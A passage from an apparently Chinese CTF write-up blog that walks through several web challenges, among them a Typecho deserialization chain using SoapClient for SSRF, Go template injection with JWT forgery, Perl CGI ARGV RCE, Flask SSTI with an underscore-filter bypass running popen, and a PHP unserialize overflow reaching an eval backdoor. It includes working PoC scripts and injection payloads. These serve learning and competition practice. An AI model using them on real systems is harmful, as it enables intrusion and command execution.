class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> <span class="variable">$adapterName</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现只有一个可能可以利用的<code>Typecho_Db_Query::__toString</code>，会根据<code>$this-&gt;_sqlPreBuild[&#39;action&#39;]</code>的值来执行不同的方法，这里比较简单的就<code>SELECT</code>对应的<code>$this-&gt;_adapter</code>是一个类，调用了方法，这里可以触发<code>call</code>方法，再结合前面得到flag的要求，可以想到原生类中<code>SoapClient</code>的call方法可以实现<code>SSRF</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">        <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;INSERT INTO &#x27;</span></span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">            . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">            . <span class="string">&#x27; VALUES &#x27;</span></span><br><span class="line">            . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;limit&#x27;</span>];</span><br><span class="line">        <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;DELETE FROM &#x27;</span></span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">        <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">            <span class="variable">$columns</span> = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                    <span class="variable">$columns</span>[] = <span class="string">&quot;<span class="subst">$key</span> = <span class="subst">$val</span>&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;UPDATE &#x27;</span></span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">            . <span class="string">&#x27; SET &#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, <span class="variable">$columns</span>)</span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_adapter</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sqlPreBuild</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> SoapFault</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>] = <span class="string">&#x27;SELECT&#x27;</span>;</span><br><span class="line">        <span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cookie: PHPSESSID=oevfk4u8cpvu893e1jhj176n76&#x27;</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;ameuu^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$coincidence</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;hello&#x27;</span>] = <span class="keyword">new</span> Typecho_Db_Query();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;world&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="keyword">new</span> HelloWorld_DB());</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a</span> = str_ireplace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = preg_replace(<span class="string">&#x27;/%00/&#x27;</span>,<span class="string">&#x27;%5c%30%30&#x27;</span>,urlencode(<span class="variable">$a</span>));</span><br><span class="line">var_dump(urldecode(<span class="variable">$b</span>));</span><br><span class="line"><span class="variable">$V</span> = <span class="string">&#x27;O:13:&quot;HelloWorld_DB&quot;:1:&#123;S:26:&quot;\00HelloWorld_DB\00coincidence&quot;;a:2:&#123;s:5:&quot;hello&quot;;O:16:&quot;Typecho_Db_Query&quot;:2:&#123;S:26:&quot;\00Typecho_Db_Query\00_adapter&quot;;O:10:&quot;SoapClient&quot;:5:&#123;s:3:&quot;uri&quot;;s:3:&quot;aaa&quot;;s:8:&quot;location&quot;;s:25:&quot;http://127.0.0.1/flag.php&quot;;s:15:&quot;_stream_context&quot;;i:0;s:11:&quot;_user_agent&quot;;s:79:&quot;ameuu</span></span><br><span class="line"><span class="string">X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=oevfk4u8cpvu893e1jhj176n76&quot;;s:13:&quot;_soap_version&quot;;i:1;&#125;S:30:&quot;\00Typecho_Db_Query\00_sqlPreBuild&quot;;a:1:&#123;s:6:&quot;action&quot;;s:6:&quot;SELECT&quot;;&#125;&#125;s:5:&quot;world&quot;;s:0:&quot;&quot;;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span>(base64_encode(<span class="variable">$V</span>));</span><br><span class="line"><span class="comment">//echo(urlencode($V));</span></span><br></pre></td></tr></table></figure>

<h2 id="LineCTF2022-gotm"><a href="#LineCTF2022-gotm" class="headerlink" title="[LineCTF2022]gotm"></a>[LineCTF2022]gotm</h2><ul>
<li>gogogo</li>
</ul>
<p>只有一个<code>main.go</code>，直接来看所有的方法</p>
<p>根目录下！将<code>X-Token</code>进行jwt解码之后然后进行赋值，而<code>template.New(&quot;&quot;).Parse(&quot;Logged in as &quot; + acc.id)</code>中存在SSTI注入</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">root_handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	token := r.Header.Get(<span class="string">&quot;X-Token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> token != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		id, _ := jwt_decode(token)</span><br><span class="line">		acc := get_account(id)</span><br><span class="line">		tpl, err := template.New(<span class="string">&quot;&quot;</span>).Parse(<span class="string">&quot;Logged in as &quot;</span> + acc.id)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		&#125;</span><br><span class="line">		tpl.Execute(w, &amp;acc)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注册功能，传id或者pw进行注册</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">regist_handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	uid := r.FormValue(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">	upw := r.FormValue(<span class="string">&quot;pw&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> uid == <span class="string">&quot;&quot;</span> || upw == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> get_account(uid).id != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		w.WriteHeader(http.StatusForbidden)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(acc) &gt; <span class="number">4</span> &#123;</span><br><span class="line">		clear_account()</span><br><span class="line">	&#125;</span><br><span class="line">	new_acc := Account&#123;uid, upw, <span class="literal">false</span>, secret_key&#125;</span><br><span class="line">	acc = <span class="built_in">append</span>(acc, new_acc)</span><br><span class="line"></span><br><span class="line">	p := Resp&#123;<span class="literal">true</span>, <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">	res, err := json.Marshal(p)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	&#125;</span><br><span class="line">	w.Write(res)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>登录功能，<code>jwt_encode</code>对登录的账户的id以及是否为admin进行jwt加密</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">auth_handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	uid := r.FormValue(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">	upw := r.FormValue(<span class="string">&quot;pw&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> uid == <span class="string">&quot;&quot;</span> || upw == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(acc) &gt; <span class="number">1024</span> &#123;</span><br><span class="line">		clear_account()</span><br><span class="line">	&#125;</span><br><span class="line">	user_acc := get_account(uid)</span><br><span class="line">	<span class="keyword">if</span> user_acc.id != <span class="string">&quot;&quot;</span> &amp;&amp; user_acc.pw == upw &#123;</span><br><span class="line">		token, err := jwt_encode(user_acc.id, user_acc.is_admin)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		p := TokenResp&#123;<span class="literal">true</span>, token&#125;</span><br><span class="line">		res, err := json.Marshal(p)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		&#125;</span><br><span class="line">		w.Write(res)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	w.WriteHeader(http.StatusForbidden)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据判断token，如果是admin就直接返回flag</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">flag_handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	token := r.Header.Get(<span class="string">&quot;X-Token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> token != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		id, is_admin := jwt_decode(token)</span><br><span class="line">		<span class="keyword">if</span> is_admin == <span class="literal">true</span> &#123;</span><br><span class="line">			p := Resp&#123;<span class="literal">true</span>, <span class="string">&quot;Hi &quot;</span> + id + <span class="string">&quot;, flag is &quot;</span> + flag&#125;</span><br><span class="line">			res, err := json.Marshal(p)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			&#125;</span><br><span class="line">			w.Write(res)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			w.WriteHeader(http.StatusForbidden)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整体的思路大概都懂了</p>
<p>总的来说就是先注册账号，并在<code>/</code>目录下ssti注入获取<code>secret_key</code>，然后伪造jwt获取flag</p>
<h3 id="go-ssti"><a href="#go-ssti" class="headerlink" title="go ssti"></a>go ssti</h3><p><img src="https://img-blog.csdnimg.cn/c72590ede7034490a56340b59f255818.png" alt="image-20220620163230287"></p>
<h2 id="CSAWQual-2016-i-got-id"><a href="#CSAWQual-2016-i-got-id" class="headerlink" title="[CSAWQual 2016]i_got_id"></a>[CSAWQual 2016]i_got_id</h2><ul>
<li>perl CGI</li>
<li>perl ARGV文件上传 RCE</li>
</ul>
<h3 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h3><p><a href="https://www.freesion.com/article/35001374751/">https://www.freesion.com/article/35001374751/</a></p>
<h3 id="ARGV"><a href="#ARGV" class="headerlink" title="ARGV"></a>ARGV</h3><p><a href="https://www.jianshu.com/p/51f083b802f0">https://www.jianshu.com/p/51f083b802f0</a></p>
<h3 id="做题-1"><a href="#做题-1" class="headerlink" title="做题"></a>做题</h3><p>万能的buu直接给了源码，利用CGI文件上传</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings;</span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $cgi = CGI-&gt;new;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($cgi-&gt;upload(<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">my</span> $file = $cgi-&gt;param(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">    <span class="keyword">while</span> (&lt;$file&gt;) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;$_&quot;</span>;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>param</code></p>
<p><img src="https://img-blog.csdnimg.cn/8d25e9f329a14395bc281f8dcc47818f.png"></p>
<p><a href="https://blog.csdn.net/chizhaji/article/details/113920025%EF%BC%9A">https://blog.csdn.net/chizhaji/article/details/113920025：</a></p>
<p><img src="https://img-blog.csdnimg.cn/ff435b26644c4acf89c80032f10817ec.png" alt="image-20220621102712383"></p>
<p>所以可以上传一个文件，抓包，复制数据包类型将文件名删掉，内容为<code>ARGV</code>，使得可以获取到get方式所传的值并命令执行（原理还在学</p>
<h2 id="CISCN2019-Web2"><a href="#CISCN2019-Web2" class="headerlink" title="[CISCN2019]Web2"></a>[CISCN2019]Web2</h2><p>没有源码</p>
<p>注册登录之后可以发表文章，感觉可能存在XSS，可以发现在反馈的地方会让管理员点击链接，那么不就是存在CSRF嘛</p>
<p>但是构造点在哪里呢。仔细想一下，这里我们可以控制的也就只有发表文章了，说明应该是构造文章内容，因为可操作性很大，所以可能可以自行写一个表单，让管理员点击实现管理员登录</p>
<p>那么该写一个什么样的表单才能够实现捏</p>
<blockquote>
<p>xss平台注册失败 呜哇</p>
</blockquote>
<h2 id="pasecactf-2019-flask-ssti"><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">line, key, key2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(x ^ <span class="built_in">ord</span>(line[x]) ^ <span class="built_in">ord</span>(key[::-<span class="number">1</span>][x]) ^ <span class="built_in">ord</span>(key2[x])) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(line)))</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;flag&#x27;</span>] = encode(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W34&#x27;</span>, <span class="string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT5&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>先打开靶场，发现一开始怎么输入都没有反应，直接post </p>
<p><code>&#123;&#123;config&#125;&#125;</code>之后会发现存在flag，其实这里直接用题目已经给的脚本就可以跑出flag了</p>
<p>但是要好好学习！！！！</p>
<p>直接继续<code>SSTI</code></p>
<p>测试一下可以发现<code>.|_|&#39;</code>被ban了，单引号被ban没什么关系可以用<code>&quot;</code>替代，但是<code>.</code>和<code>_</code>一般是必然会用到的，不能被替代，<code>.</code>可以用<code>[]</code>来代替，而<code>_</code>可以利用十六进制绕过<code>_|\x5F</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;]&#125;&#125;  &quot;&quot;.__class__</span><br><span class="line">&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbase\x5f\x5f&quot;][&quot;\x5f\x5fsubclassed\x5f\x5f&quot;]()&#125;&#125; &quot;&quot;.__class__.__base__.__subclasses__() 找可利用的包，这里不能用warnings.catch_warnings，在后面找os的时候找不到这里看了别的师傅的wp，师傅直接用的是类os._wrap_close</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/f75889d3ec5248768692805a2339022b.png" alt="image-20220621141109765"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbase\x5f\x5f&quot;][&quot;\x5f\x5fsubclassed\x5f\x5f&quot;]()[127][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;popen&quot;](&quot;cat ap*&quot;)[&quot;read&quot;]()&#125;&#125;&#125; </span><br></pre></td></tr></table></figure>

<p>分析源码，<code>app.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, render_template, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;folow @osminogka.ann on instagram =)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Tiaonmmn don&#x27;t remember to remove this part on deploy so nobody will solve that hehe</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def encode(line, key, key2):</span></span><br><span class="line"><span class="string">    return &#x27;&#x27;.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">app.config[&#x27;flag&#x27;] = encode(&#x27;&#x27;, &#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;, &#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">line, key, key2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(x ^ <span class="built_in">ord</span>(line[x]) ^ <span class="built_in">ord</span>(key[::-<span class="number">1</span>][x]) ^ <span class="built_in">ord</span>(key2[x])) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(line)))</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/app/flag&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">flag = file.read()</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;flag&#x27;</span>] = encode(flag, <span class="string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;</span>, <span class="string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#x27;</span>)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">os.remove(<span class="string">&quot;/app/flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">nicknames = [<span class="string">&#x27;˜”*°★☆★_%s_★☆★°°*&#x27;</span>, <span class="string">&#x27;%s ~♡ⓛⓞⓥⓔ♡~&#x27;</span>, <span class="string">&#x27;%s Вêчңø в øĤлâйĤé&#x27;</span>, <span class="string">&#x27;♪ ♪ ♪ %s ♪ ♪ ♪ &#x27;</span>, <span class="string">&#x27;[♥♥♥%s♥♥♥]&#x27;</span>, <span class="string">&#x27;%s, kOтO®Aя )(оТеЛ@ ©4@$tьЯ&#x27;</span>, <span class="string">&#x27;♔%s♔&#x27;</span>, <span class="string">&#x27;[♂+♂=♥]%s[♂+♂=♥]&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="comment"># 需要请求方式为POST才能get到nickname</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>: </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = request.values.get(<span class="string">&#x27;nickname&#x27;</span>)</span><br><span class="line">            <span class="built_in">id</span> = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(nicknames) - <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> p != <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> p <span class="keyword">or</span> <span class="string">&#x27;_&#x27;</span> <span class="keyword">in</span> p <span class="keyword">or</span> <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">in</span> p:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;Your nickname contains restricted characters!&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> render_template_string(nicknames[<span class="built_in">id</span>] % p) <span class="comment"># 注入</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Exception&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">1337</span>)</span><br></pre></td></tr></table></figure>

<p>重点就是加密的方法了，可以通过<code>&#123;&#123;config&#125;&#125;</code>得到被加密之后的flag的值</p>
<blockquote>
<p>-M7\x10w\x12287\x00qfx\x0eL\x0cnR(D\x1bN\\x17{2\x06h\x02\r\x10\t#P.|\x11l\x10[\x17G</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/75af702e38fc44f387ab384926584e33.png" alt="image-20220621141328046"></p>
<h2 id="蓝帽杯-2021-One-Pointer-PHP"><a href="#蓝帽杯-2021-One-Pointer-PHP" class="headerlink" title="[蓝帽杯 2021]One Pointer PHP"></a>[蓝帽杯 2021]One Pointer PHP</h2><p><code>user.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="0x01-简单的溢出"><a href="#0x01-简单的溢出" class="headerlink" title="0x01:简单的溢出"></a>0x01:简单的溢出</h4><p>直接poc：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;count = <span class="number">9223372036854775806</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User();</span><br><span class="line">var_dump(urlencode(serialize(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>

<p>看phpinfo，可以发现很多函数都不能用，并且open_basedir也限制了在<code>/var/www/html</code>。写一句话用蚁剑链发现几乎什么都做不了，因为插件没弄好没法绕过<code>open_basedir</code></p>
<p><img src="https://img-blog.csdnimg.cn/da276cf62d3f4437ad038d72ae75b8f4.png" alt="image-20220621145959690"></p>
